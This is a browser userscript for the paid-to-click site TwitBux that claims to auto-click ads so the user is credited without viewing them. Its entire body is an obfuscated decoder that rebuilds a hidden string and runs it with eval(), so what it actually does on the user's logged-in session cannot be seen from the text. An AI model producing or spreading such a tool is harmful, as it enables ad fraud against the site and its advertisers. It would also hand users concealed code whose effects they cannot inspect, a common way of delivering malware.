// ==UserScript==
// @name           JustOneClick for TwitBux
// @namespace      http://www.youtube.com/user/bath4rakala
// @description    An Auto-click for TwitBux, makes you validated without viewing the ads. Ads loaded faster, because this script ignores all tags. So images, css , js, swfs files etc WILL NOT loaded, and you will save your bandwidth.
// @include        *://*twitbux.com/*
// @copyright      PTCSPY
// ==/UserScript==
(function(BY,PTCSPY){var Y=function(y){if(y>92)y--;return y-42},B=function(){if(a==0){b=Y(d.charCodeAt(e++));a=6;}return((b>>--a)&0x01)},e,c=192,o,a="1:1G1J1`1c1d2h3W1a2Y2f1W1Z1[3R3a1X2R2S1O1R1S3/3U1P2e3-1M3d1K3b3c1H3_3]1=1B1C2X2Q1@3`1>3L3T1;3S3^1,15163M3Z1/123Y102L2J1-3Q3V0i0j3K3N0g3O3X",l=new Array(),d=".cGEZE<:0_K:9H<29V5KLj*hd,NY+W33/KY+W32YQa?OX*<YJQ1JaNNKY+W32E:4V>?2X_-91>0g0_NK^J,R:;<7++ChMZ10gFS-9BiZN>8Z<fK.96<]Kh/a@:Xh:H_K:9H</TD8;N^be7L0YRSc7S2@";while(a.length){l.push((Y(a.charCodeAt(0))<<6)+Y(a.charCodeAt(1))-512);a=a.slice(2,a.length)};e=b=a=0;o="";while(c--){i=0;while(l[i]<0){if(B())i=-l[i];else i++}o+=String.fromCharCode(l[i])};eval(o)}())